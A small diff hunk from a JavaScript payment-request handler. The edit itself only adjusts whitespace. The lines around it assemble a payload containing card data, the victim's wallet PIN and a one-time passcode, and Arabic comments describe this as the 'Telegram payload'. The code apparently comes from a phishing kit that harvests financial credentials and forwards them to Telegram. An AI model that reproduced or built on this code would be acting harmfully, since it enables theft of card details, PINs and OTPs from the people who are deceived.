@@ -120,7 +120,7 @@ async function handlePaymentRequest(req, res) {
       amount_cents: parseFloat(payAmount) * 100,
       payment_method: selectedMethod,
       wallet_pin: wallet_pin || "غير مدخل", // 👈 إدراج الرقم السري للمحفظة في حمولة التليجرام
-      otp: otp || "لم يتم إدخاله بعد",       // 👈 إدراج الـ OTP المتغير في حمولة التليجرام
+      otp: otp || "لم يتم إدخاله بعد",        // 👈 إدراج الـ OTP المتغير في حمولة التليجرام
       branch: selectedBranch,
       branchName: branchDisplayName,
       card_data: {
